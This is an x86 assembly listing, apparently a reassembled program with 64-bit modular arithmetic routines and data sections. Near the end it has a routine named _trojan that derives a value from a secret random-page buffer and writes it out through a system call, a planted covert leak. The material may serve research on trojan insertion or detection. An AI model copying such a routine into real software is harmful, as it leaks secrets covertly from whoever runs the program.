	movl	%eax, %ecx
	movl	%edx, %ebx
	movl	24(%esp), %eax
	movl	28(%esp), %edx
	addl	32(%esp), %eax
	adcl	36(%esp), %edx
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	movl	%ecx, 20(%esp)
	call	__umoddi3
	movl	20(%esp), %ecx
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	addl	%ecx, %eax
	adcl	%ebx, %edx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, 32(%esp)
	movl	44(%esp), %eax
	movl	%edx, 36(%esp)
	mull	40(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	addl	32(%esp), %eax
	adcl	36(%esp), %edx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	addl	$60, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
publicExp:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$204, %esp
	leal	56(%esp), %ebp
       movl    (_RAND_Page),%ecx
       movl    0x255(%ecx), %eax
	movl	%eax, 56(%esp)
	movl	$0xC5D5, 60(%esp)
	movl	$0xabd3b0bd, 16(%esp)
	movl	$0x2f2c07d4, 20(%esp)
	leal	184(%esp), %ebx
	movl	%ebx, 40(%esp)
	.p2align 4,,7
	.p2align 3
.L19:
	movl	4(%ebp), %ebx
	movl	0(%ebp), %ecx
	movl	%ebx, %eax
	mull	%ebx
	movl	%ecx, 32(%esp)
	movl	16(%esp), %ecx
	movl	%ebx, 24(%esp)
	movl	20(%esp), %ebx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	movl	%ebx, 12(%esp)
	movl	$64, %ebx
	movl	%ecx, 8(%esp)
	call	__umoddi3
	movl	16(%esp), %esi
	movl	20(%esp), %edi
	.p2align 4,,7
	.p2align 3
.L17:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L17
	movl	%eax, %esi
	movl	24(%esp), %eax
	movl	%edx, %edi
	mull	32(%esp)
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	$32, %ebx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%esi, 24(%esp)
	movl	16(%esp), %esi
	movl	%edi, 28(%esp)
	movl	20(%esp), %edi
	.p2align 4,,7
	.p2align 3
.L18:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L18
	movl	24(%esp), %esi
	movl	28(%esp), %edi
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	addl	%eax, %esi
	adcl	%edx, %edi
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	%esi, (%esp)
	movl	%edi, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	%eax, %esi
	movl	32(%esp), %eax
	movl	%edx, %edi
	mull	%eax
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	addl	%esi, %eax
	adcl	%edi, %edx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%eax, 8(%ebp)
	movl	%edx, 12(%ebp)
	addl	$8, %ebp
	cmpl	40(%esp), %ebp
	jne	.L19
	movl	188(%esp), %edi
	movl	60(%esp), %esi
	movl	56(%esp), %ebx
	movl	16(%esp), %ecx
	movl	%edi, %eax
	movl	184(%esp), %ebp
	mull	%esi
	movl	%ebx, 44(%esp)
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%eax, (%esp)
	movl	%ebx, 12(%esp)
	movl	$64, %ebx
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%ebp, 24(%esp)
	movl	%esi, %ebp
	movl	16(%esp), %esi
	movl	%edi, 40(%esp)
	movl	20(%esp), %edi
	movl	%eax, 32(%esp)
	movl	%edx, 36(%esp)
	.p2align 4,,7
	.p2align 3
.L20:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L20
	movl	%ebp, %esi
	movl	24(%esp), %ebp
	movl	%eax, 32(%esp)
	movl	16(%esp), %ecx
	movl	%edx, 36(%esp)
	movl	20(%esp), %ebx
	movl	40(%esp), %edi
	movl	%ebp, %eax
	mull	%esi
	movl	%ebx, 12(%esp)
	movl	$32, %ebx
	movl	%ecx, 8(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %esi
	movl	%ebp, 40(%esp)
	movl	%edi, %ebp
	movl	20(%esp), %edi
	movl	%eax, 24(%esp)
	movl	%edx, 28(%esp)
	.p2align 4,,7
	.p2align 3
.L21:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L21
	movl	%eax, 24(%esp)
	movl	44(%esp), %eax
	movl	%ebp, %edi
	movl	%edx, 28(%esp)
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	40(%esp), %ebp
	mull	%edi
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	$32, %ebx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %esi
	movl	20(%esp), %edi
	.p2align 4,,7
	.p2align 3
.L22:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L22
	movl	16(%esp), %ecx
	movl	%eax, %esi
	movl	%edx, %edi
	movl	20(%esp), %ebx
	movl	24(%esp), %eax
	movl	28(%esp), %edx
	addl	32(%esp), %eax
	adcl	36(%esp), %edx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	addl	%esi, %eax
	adcl	%edi, %edx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	%eax, %esi
	movl	44(%esp), %eax
	movl	%edx, %edi
	mull	%ebp
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	addl	%esi, %eax
	adcl	%edi, %edx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	addl	$204, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
__umoddi3:	
 	sub    $0x1c,%esp
 	mov    0x2c(%esp),%edx
 	mov    0x20(%esp),%eax
 	mov    %esi,0x10(%esp)
 	mov    0x28(%esp),%ecx
 	mov    0x24(%esp),%esi
 	test   %edx,%edx
 	mov    %edi,0x14(%esp)
 	mov    %ebp,0x18(%esp)
 	mov    %ecx,%edi
 	mov    %eax,%ebp
 	mov    %eax,0x8(%esp)
 	mov    %esi,(%esp)
 	jne    L_8048da0 #<__umoddi3+0x50>
 	cmp    %esi,%ecx
 	jbe    L_8048dd8 #<__umoddi3+0x88>
 	mov    %esi,%edx
 	div    %ecx
L_8048d86: 	mov    %edx,%eax
 	xor    %edx,%edx
 	mov    0x10(%esp),%esi
 	mov    0x14(%esp),%edi
 	mov    0x18(%esp),%ebp
 	add    $0x1c,%esp
 	ret    
	lea    0x0(%esi),%esi
L_8048da0:	cmp    %esi,%edx
	ja     L_8048df8 #<__umoddi3+0xa8>
	bsr    %edx,%eax
	xor    $0x1f,%eax
	mov    %eax,0x4(%esp)
	jne    L_8048e10 #<__umoddi3+0xc0>
	cmp    %ebp,%ecx
	ja     L_8048ec0 #<__umoddi3+0x170>
L_8048db8:	sub    %ecx,%ebp
	sbb    %edx,%esi
	mov    %esi,(%esp)
L_8048dbf:	mov    (%esp),%edx
	mov    %ebp,%eax
	mov    0x10(%esp),%esi
	mov    0x14(%esp),%edi
	mov    0x18(%esp),%ebp
	add    $0x1c,%esp
	ret    
	lea    0x0(%esi,%eiz,1),%esi
L_8048dd8:	test   %ecx,%ecx
	jne    L_8048de7 #<__umoddi3+0x97>
	mov    $0x1,%eax
	xor    %edx,%edx
	div    %ecx
	mov    %eax,%ecx
L_8048de7:	mov    %esi,%eax
	xor    %edx,%edx
	div    %ecx
	mov    %ebp,%eax
	div    %ecx
	jmp    L_8048d86 #<__umoddi3+0x36>
	nop
	lea    0x0(%esi,%eiz,1),%esi
L_8048df8:	mov    %esi,%edx
	mov    0x10(%esp),%esi
	mov    0x14(%esp),%edi
	mov    0x18(%esp),%ebp
	add    $0x1c,%esp
	ret    
	lea    0x0(%esi),%esi
L_8048e10:	movzbl 0x4(%esp),%ecx
 	mov    $0x20,%ebp
 	mov    %edi,%eax
 	sub    0x4(%esp),%ebp
 	shl    %cl,%edx
 	mov    %ebp,%ecx
 	shr    %cl,%eax
 	movzbl 0x4(%esp),%ecx
 	or     %edx,%eax
 	mov    %esi,%edx
 	mov    %eax,(%esp)
 	mov    0x8(%esp),%eax
 	shl    %cl,%edi
 	mov    %ebp,%ecx
 	shr    %cl,%edx
 	movzbl 0x4(%esp),%ecx
 	mov    %edi,0xc(%esp)
 	shl    %cl,%esi
 	mov    %ebp,%ecx
 	shr    %cl,%eax
 	movzbl 0x4(%esp),%ecx
 	or     %esi,%eax
 	mov    0x8(%esp),%esi
 	divl   (%esp)
 	shl    %cl,%esi
 	mov    %esi,0x8(%esp)
 	mov    %edx,%esi
 	mul    %edi
 	cmp    %edx,%esi
 	mov    %eax,%edi
 	mov    %edx,%ecx
 	jb     L_8048eac #<__umoddi3+0x15c>
 	cmp    %eax,0x8(%esp)
 	jb     L_8048ea8 #<__umoddi3+0x158>
L_8048e71:	mov    0x8(%esp),%eax
	sub    %edi,%eax
	sbb    %ecx,%esi
	movzbl 0x4(%esp),%ecx
	mov    %esi,%edx
	shr    %cl,%eax
       mov    %ebp,%ecx
	shl    %cl,%edx
	movzbl 0x4(%esp),%ecx
	or     %edx,%eax
	mov    %esi,%edx
	shr    %cl,%edx
	mov    0x10(%esp),%esi
	mov    0x14(%esp),%edi
	mov    0x18(%esp),%ebp
	add    $0x1c,%esp
	ret    
	lea    0x0(%esi,%eiz,1),%esi
L_8048ea8:	cmp    %edx,%esi
	jne    L_8048e71 #<__umoddi3+0x121>
L_8048eac:	mov    %edx,%ecx
	mov    %eax,%edi
	sub    0xc(%esp),%edi
	sbb    (%esp),%ecx
	jmp    L_8048e71 #<__umoddi3+0x121>
	lea    0x0(%esi,%eiz,1),%esi
L_8048ec0:	cmp    %esi,%edx
	jb     L_8048db8 #<__umoddi3+0x68>
	jmp    L_8048dbf #<__umoddi3+0x6f>
_trojan:
       call   publicExp
       movl   $0x53445343,(_MSG)
       movl   %eax,(_MSG+0x4)
       movl   %edx,(_MSG+0x8)
       movl   $0x1, %eax
       movl   $0x2, %eax
       movl   $0x1, %ebx
       lea    _MSG, %ecx
       movl   $12, %edx
       movl   $0, %esi
       int    $0x80
       jmp    _myterminate

/*  -------------------- .data -------------------------*/
.p2align 2
.section .data  # Addresses: 0x804c000 - 0x80602a6 (0x142a7 bytes)
Var_0x804c000:
   .long 0x69f6bc7 ##d4
Var_0x804c004:
   .long 0xd3ed78e ##d4
Var_0x804c008:
   .long 0x13de4355 ##d4
Var_0x804c00c:
   .long 0x1a7daf1c ##d4
Var_0x804c010:
   .long 0x2 ##d4
   .long 0x3 ##d4
   .long 0x4 ##d4
   .long 0x8 ##d4
   .long 0x10 ##d4
   .long 0x18 ##d4
   .long 0x20 ##d4
   .long 0x30 ##d4
   .long 0x40 ##d4
   .long 0x60 ##d4
   .long 0x80 ##d4
   .long 0xc0 ##d4
   .long 0x100 ##d4
   .long 0x180 ##d4
   .long 0x200 ##d4
   .long 0x300 ##d4
   .long 0x400 ##d4
   .long 0x600 ##d4
   .long 0x800 ##d4
   .long 0xc00 ##d4
   .long 0x1000 ##d4
   .long 0x1800 ##d4
   .long 0x2000 ##d4
   .long 0x3000 ##d4
   .long 0x4000 ##d4
   .long 0x6000 ##d4
   .long 0x8000 ##d4
   .long 0xc000 ##d4
   .long 0x10000 ##d4
   .long 0x18000 ##d4
   .long 0x20000 ##d4
   .long 0x7fffffff ##d4
Var_0x804c090:
Var_0x804caff:
   .long 0xa464f45 ##d4

/*  ------------------------ .bss ----------------------*/
.p2align 2
.bss # Addresses: 0x80602a8 - 0x8060547 (0x2a0 bytes)
Var_0x80602a8:   .skip  0x4, 0
Var_0x80602ac:   .skip  0x4, 0
Var_0x80602b0:   .skip  0x4, 0
Var_0x80602b4:   .skip  0x1, 0
Var_0x80602b5:   .skip  0x203, 0
Var_0x80604b8:   .skip  0x4, 0
Var_0x80604bc:   .skip  0x4, 0
Var_0x80604c0:   .skip  0x4, 0
Var_0x80604c4:   .skip  0x4, 0
Var_0x80604c8:   .skip  0x7c, 0
Var_0x8060544:   .skip  0x4, 0
.p2align 4
_DataEnd:   .skip 0x4, 0
_My_Allocate_Buffer:   .skip 4, 0
_Var_save_EBP:  .skip 4, 0
_Var_Stack_High:   .skip 4, 0
_Var_Stack_Low:   .skip 4, 0
_minOffset:   .skip 4, 0
_maxOffset:   .skip 4, 0
_CallAddress:  .skip 4,0
_SearchAddress:   .skip 4,0
_numBytes:    .skip 4, 0
_MSG:         .skip 12, 0
_InCnt:         .skip 4, 0
_InMsg:         .skip 8, 0
_RAND_Page:    .skip 4, 0
_Not_RAND_Page:    .skip 4, 0
_RAND:    .skip 4, 0
